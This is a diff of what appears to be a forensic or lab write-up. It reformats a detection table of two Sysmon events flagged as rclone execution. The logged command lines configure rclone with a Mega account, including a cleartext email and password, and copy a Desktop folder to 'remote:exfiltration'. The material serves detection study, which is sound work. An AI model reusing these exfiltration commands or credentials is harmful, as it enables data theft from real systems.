@@ -30,101 +30,101 @@ And here is the result
 
 ```
 ┌────────────────────────────┬───────┬──────────────────────────┬──────────┬───────────┬────────────────────────────────┐
-│      timestamp              detections         │ count │  Event.System.Provider   │ Event ID │ Record ID │           Event Data           │
-├────────────────────────────────────────────────┼───────┼──────────────────────────┼──────────┼───────────┼────────────────────────────────┤
-│ 2023-02-24 15:35:07 ‣ Rclone Execution via     │ 1     │ Microsoft-Windows-Sysmon │ 1        │ 76        │ ---                            │
-│                     Command Line or PowerShell │       │                          │          │           │ CommandLine: "\"C:\\Users\\wad │
-│                                                │       │                          │          │           │ e\\AppData\\Local\\Temp\\rclon │
-│                                                │       │                          │          │           │ e-v1.61.1-windows-amd64\\rclon │
-│                                                │       │                          │          │           │ e.exe\" config create remote m │
-│                                                │       │                          │          │           │ ega user majmeret@protonmail.c │
-│                                                │       │                          │          │           │ om pass FBMeavdiaFZbWzpMqIVhJC │
-│                                                │       │                          │          │           │ GXZ5XXZI1qsU3EjhoKQw0rEoQqHyI" │
-│                                                │       │                          │          │           │ Company: "https://rclone.org"  │
-│                                                │       │                          │          │           │ CurrentDirectory: "C:\\Users\\ │
-│                                                │       │                          │          │           │ wade\\AppData\\Local\\Temp\\rc │
-│                                                │       │                          │          │           │ lone-v1.61.1-windows-amd64\\"  │
-│                                                │       │                          │          │           │ Description: Rsync for cloud s │
-│                                                │       │                          │          │           │ torage                         │
-│                                                │       │                          │          │           │ FileVersion: 1.61.1            │
-│                                                │       │                          │          │           │ Hashes: SHA256=E94901809FF7CC5 │
-│                                                │       │                          │          │           │ 168C1E857D4AC9CBB339CA1F6E21DC │
-│                                                │       │                          │          │           │ CE95DFB8E28DF799961            │
-│                                                │       │                          │          │           │ Image: "C:\\Users\\wade\\AppDa │
-│                                                │       │                          │          │           │ ta\\Local\\Temp\\rclone-v1.61. │
-│                                                │       │                          │          │           │ 1-windows-amd64\\rclone.exe"   │
-│                                                │       │                          │          │           │ IntegrityLevel: Medium         │
-│                                                │       │                          │          │           │ LogonGuid: 10DA3E43-D892-63F8- │
-│                                                │       │                          │          │           │ 4B6D-030000000000              │
-│                                                │       │                          │          │           │ LogonId: "0x36d4b"             │
-│                                                │       │                          │          │           │ OriginalFileName: rclone.exe   │
-│                                                │       │                          │          │           │ ParentCommandLine: "\"C:\\Wind │
-│                                                │       │                          │          │           │ ows\\System32\\WindowsPowerShe │
-│                                                │       │                          │          │           │ ll\\v1.0\\powershell.exe\" "   │
-│                                                │       │                          │          │           │ ParentImage: "C:\\Windows\\Sys │
-│                                                │       │                          │          │           │ tem32\\WindowsPowerShell\\v1.0 │
-│                                                │       │                          │          │           │ \\powershell.exe"              │
-│                                                │       │                          │          │           │ ParentProcessGuid: 10DA3E43-D8 │
-│                                                │       │                          │          │           │ D2-63F8-9B00-000000000900      │
-│                                                │       │                          │          │           │ ParentProcessId: 5888          │
-│                                                │       │                          │          │           │ ParentUser: "DESKTOP-UTDHED2\\ │
-│                                                │       │                          │          │           │ wade"                          │
-│                                                │       │                          │          │           │ ProcessGuid: 10DA3E43-D92B-63F │
-│                                                │       │                          │          │           │ 8-B100-000000000900            │
-│                                                │       │                          │          │           │ ProcessId: 3820                │
-│                                                │       │                          │          │           │ Product: Rclone                │
-│                                                │       │                          │          │           │ RuleName: "-"                  │
-│                                                │       │                          │          │           │ TerminalSessionId: 1           │
-│                                                │       │                          │          │           │ User: "DESKTOP-UTDHED2\\wade"  │
-│                                                │       │                          │          │           │ UtcTime: "2023-02-24 15:35:07. │
-│                                                │       │                          │          │           │ 336"                           │
-├────────────────────────────────────────────────┼───────┼──────────────────────────┼──────────┼───────────┼────────────────────────────────┤
-│ 2023-02-24 15:35:17 ‣ Rclone Execution via     │ 1     │ Microsoft-Windows-Sysmon │ 1        │ 78        │ ---                            │
-│                     Command Line or PowerShell │       │                          │          │           │ CommandLine: "\"C:\\Users\\wad │
-│                                                │       │                          │          │           │ e\\AppData\\Local\\Temp\\rclon │
-│                                                │       │                          │          │           │ e-v1.61.1-windows-amd64\\rclon │
-│                                                │       │                          │          │           │ e.exe\" copy C:\\Users\\Wade\\ │
-│                                                │       │                          │          │           │ Desktop\\Relic_location\\ remo │
-│                                                │       │                          │          │           │ te:exfiltration -v"            │
-│                                                │       │                          │          │           │ Company: "https://rclone.org"  │
-│                                                │       │                          │          │           │ CurrentDirectory: "C:\\Users\\ │
-│                                                │       │                          │          │           │ wade\\AppData\\Local\\Temp\\rc │
-│                                                │       │                          │          │           │ lone-v1.61.1-windows-amd64\\"  │
-│                                                │       │                          │          │           │ Description: Rsync for cloud s │
-│                                                │       │                          │          │           │ torage                         │
-│                                                │       │                          │          │           │ FileVersion: 1.61.1            │
-│                                                │       │                          │          │           │ Hashes: SHA256=E94901809FF7CC5 │
-│                                                │       │                          │          │           │ 168C1E857D4AC9CBB339CA1F6E21DC │
-│                                                │       │                          │          │           │ CE95DFB8E28DF799961            │
-│                                                │       │                          │          │           │ Image: "C:\\Users\\wade\\AppDa │
-│                                                │       │                          │          │           │ ta\\Local\\Temp\\rclone-v1.61. │
-│                                                │       │                          │          │           │ 1-windows-amd64\\rclone.exe"   │
-│                                                │       │                          │          │           │ IntegrityLevel: Medium         │
-│                                                │       │                          │          │           │ LogonGuid: 10DA3E43-D892-63F8- │
-│                                                │       │                          │          │           │ 4B6D-030000000000              │
-│                                                │       │                          │          │           │ LogonId: "0x36d4b"             │
-│                                                │       │                          │          │           │ OriginalFileName: rclone.exe   │
-│                                                │       │                          │          │           │ ParentCommandLine: "\"C:\\Wind │
-│                                                │       │                          │          │           │ ows\\System32\\WindowsPowerShe │
-│                                                │       │                          │          │           │ ll\\v1.0\\powershell.exe\" "   │
-│                                                │       │                          │          │           │ ParentImage: "C:\\Windows\\Sys │
-│                                                │       │                          │          │           │ tem32\\WindowsPowerShell\\v1.0 │
-│                                                │       │                          │          │           │ \\powershell.exe"              │
-│                                                │       │                          │          │           │ ParentProcessGuid: 10DA3E43-D8 │
-│                                                │       │                          │          │           │ D2-63F8-9B00-000000000900      │
-│                                                │       │                          │          │           │ ParentProcessId: 5888          │
-│                                                │       │                          │          │           │ ParentUser: "DESKTOP-UTDHED2\\ │
-│                                                │       │                          │          │           │ wade"                          │
-│                                                │       │                          │          │           │ ProcessGuid: 10DA3E43-D935-63F │
-│                                                │       │                          │          │           │ 8-B200-000000000900            │
-│                                                │       │                          │          │           │ ProcessId: 5116                │
-│                                                │       │                          │          │           │ Product: Rclone                │
-│                                                │       │                          │          │           │ RuleName: "-"                  │
-│                                                │       │                          │          │           │ TerminalSessionId: 1           │
-│                                                │       │                          │          │           │ User: "DESKTOP-UTDHED2\\wade"  │
-│                                                │       │                          │          │           │ UtcTime: "2023-02-24 15:35:17. │
-│                                                │       │                          │          │           │ 516"                           │
-└────────────────────────────────────────────────┴───────┴──────────────────────────┴──────────┴───────────┴────────────────────────────────┘
+│         detections         │ count │  Event.System.Provider   │ Event ID │ Record ID │           Event Data           │
+├────────────────────────────┼───────┼──────────────────────────┼──────────┼───────────┼────────────────────────────────┤
+│ ‣ Rclone Execution via     │ 1     │ Microsoft-Windows-Sysmon │ 1        │ 76        │ ---                            │
+│ Command Line or PowerShell │       │                          │          │           │ CommandLine: "\"C:\\Users\\wad │
+│                            │       │                          │          │           │ e\\AppData\\Local\\Temp\\rclon │
+│                            │       │                          │          │           │ e-v1.61.1-windows-amd64\\rclon │
+│                            │       │                          │          │           │ e.exe\" config create remote m │
+│                            │       │                          │          │           │ ega user majmeret@protonmail.c │
+│                            │       │                          │          │           │ om pass FBMeavdiaFZbWzpMqIVhJC │
+│                            │       │                          │          │           │ GXZ5XXZI1qsU3EjhoKQw0rEoQqHyI" │
+│                            │       │                          │          │           │ Company: "https://rclone.org"  │
+│                            │       │                          │          │           │ CurrentDirectory: "C:\\Users\\ │
+│                            │       │                          │          │           │ wade\\AppData\\Local\\Temp\\rc │
+│                            │       │                          │          │           │ lone-v1.61.1-windows-amd64\\"  │
+│                            │       │                          │          │           │ Description: Rsync for cloud s │
+│                            │       │                          │          │           │ torage                         │
+│                            │       │                          │          │           │ FileVersion: 1.61.1            │
+│                            │       │                          │          │           │ Hashes: SHA256=E94901809FF7CC5 │
+│                            │       │                          │          │           │ 168C1E857D4AC9CBB339CA1F6E21DC │
+│                            │       │                          │          │           │ CE95DFB8E28DF799961            │
+│                            │       │                          │          │           │ Image: "C:\\Users\\wade\\AppDa │
+│                            │       │                          │          │           │ ta\\Local\\Temp\\rclone-v1.61. │
+│                            │       │                          │          │           │ 1-windows-amd64\\rclone.exe"   │
+│                            │       │                          │          │           │ IntegrityLevel: Medium         │
+│                            │       │                          │          │           │ LogonGuid: 10DA3E43-D892-63F8- │
+│                            │       │                          │          │           │ 4B6D-030000000000              │
+│                            │       │                          │          │           │ LogonId: "0x36d4b"             │
+│                            │       │                          │          │           │ OriginalFileName: rclone.exe   │
+│                            │       │                          │          │           │ ParentCommandLine: "\"C:\\Wind │
+│                            │       │                          │          │           │ ows\\System32\\WindowsPowerShe │
+│                            │       │                          │          │           │ ll\\v1.0\\powershell.exe\" "   │
+│                            │       │                          │          │           │ ParentImage: "C:\\Windows\\Sys │
+│                            │       │                          │          │           │ tem32\\WindowsPowerShell\\v1.0 │
+│                            │       │                          │          │           │ \\powershell.exe"              │
+│                            │       │                          │          │           │ ParentProcessGuid: 10DA3E43-D8 │
+│                            │       │                          │          │           │ D2-63F8-9B00-000000000900      │
+│                            │       │                          │          │           │ ParentProcessId: 5888          │
+│                            │       │                          │          │           │ ParentUser: "DESKTOP-UTDHED2\\ │
+│                            │       │                          │          │           │ wade"                          │
+│                            │       │                          │          │           │ ProcessGuid: 10DA3E43-D92B-63F │
+│                            │       │                          │          │           │ 8-B100-000000000900            │
+│                            │       │                          │          │           │ ProcessId: 3820                │
+│                            │       │                          │          │           │ Product: Rclone                │
+│                            │       │                          │          │           │ RuleName: "-"                  │
+│                            │       │                          │          │           │ TerminalSessionId: 1           │
+│                            │       │                          │          │           │ User: "DESKTOP-UTDHED2\\wade"  │
+│                            │       │                          │          │           │ UtcTime: "2023-02-24 15:35:07. │
+│                            │       │                          │          │           │ 336"                           │
+├────────────────────────────┼───────┼──────────────────────────┼──────────┼───────────┼────────────────────────────────┤
+│ ‣ Rclone Execution via     │ 1     │ Microsoft-Windows-Sysmon │ 1        │ 78        │ ---                            │
+│ Command Line or PowerShell │       │                          │          │           │ CommandLine: "\"C:\\Users\\wad │
+│                            │       │                          │          │           │ e\\AppData\\Local\\Temp\\rclon │
+│                            │       │                          │          │           │ e-v1.61.1-windows-amd64\\rclon │
+│                            │       │                          │          │           │ e.exe\" copy C:\\Users\\Wade\\ │
+│                            │       │                          │          │           │ Desktop\\Relic_location\\ remo │
+│                            │       │                          │          │           │ te:exfiltration -v"            │
+│                            │       │                          │          │           │ Company: "https://rclone.org"  │
+│                            │       │                          │          │           │ CurrentDirectory: "C:\\Users\\ │
+│                            │       │                          │          │           │ wade\\AppData\\Local\\Temp\\rc │
+│                            │       │                          │          │           │ lone-v1.61.1-windows-amd64\\"  │
+│                            │       │                          │          │           │ Description: Rsync for cloud s │
+│                            │       │                          │          │           │ torage                         │
+│                            │       │                          │          │           │ FileVersion: 1.61.1            │
+│                            │       │                          │          │           │ Hashes: SHA256=E94901809FF7CC5 │
+│                            │       │                          │          │           │ 168C1E857D4AC9CBB339CA1F6E21DC │
+│                            │       │                          │          │           │ CE95DFB8E28DF799961            │
+│                            │       │                          │          │           │ Image: "C:\\Users\\wade\\AppDa │
+│                            │       │                          │          │           │ ta\\Local\\Temp\\rclone-v1.61. │
+│                            │       │                          │          │           │ 1-windows-amd64\\rclone.exe"   │
+│                            │       │                          │          │           │ IntegrityLevel: Medium         │
+│                            │       │                          │          │           │ LogonGuid: 10DA3E43-D892-63F8- │
+│                            │       │                          │          │           │ 4B6D-030000000000              │
+│                            │       │                          │          │           │ LogonId: "0x36d4b"             │
+│                            │       │                          │          │           │ OriginalFileName: rclone.exe   │
+│                            │       │                          │          │           │ ParentCommandLine: "\"C:\\Wind │
+│                            │       │                          │          │           │ ows\\System32\\WindowsPowerShe │
+│                            │       │                          │          │           │ ll\\v1.0\\powershell.exe\" "   │
+│                            │       │                          │          │           │ ParentImage: "C:\\Windows\\Sys │
+│                            │       │                          │          │           │ tem32\\WindowsPowerShell\\v1.0 │
+│                            │       │                          │          │           │ \\powershell.exe"              │
+│                            │       │                          │          │           │ ParentProcessGuid: 10DA3E43-D8 │
+│                            │       │                          │          │           │ D2-63F8-9B00-000000000900      │
+│                            │       │                          │          │           │ ParentProcessId: 5888          │
+│                            │       │                          │          │           │ ParentUser: "DESKTOP-UTDHED2\\ │
+│                            │       │                          │          │           │ wade"                          │
+│                            │       │                          │          │           │ ProcessGuid: 10DA3E43-D935-63F │
+│                            │       │                          │          │           │ 8-B200-000000000900            │
+│                            │       │                          │          │           │ ProcessId: 5116                │
+│                            │       │                          │          │           │ Product: Rclone                │
+│                            │       │                          │          │           │ RuleName: "-"                  │
+│                            │       │                          │          │           │ TerminalSessionId: 1           │
+│                            │       │                          │          │           │ User: "DESKTOP-UTDHED2\\wade"  │
+│                            │       │                          │          │           │ UtcTime: "2023-02-24 15:35:17. │
+│                            │       │                          │          │           │ 516"                           │
+└────────────────────────────┴───────┴──────────────────────────┴──────────┴───────────┴────────────────────────────────┘
 ```
 
 I deleted the `timestamp` and `Computer` column for smaller and brief output\
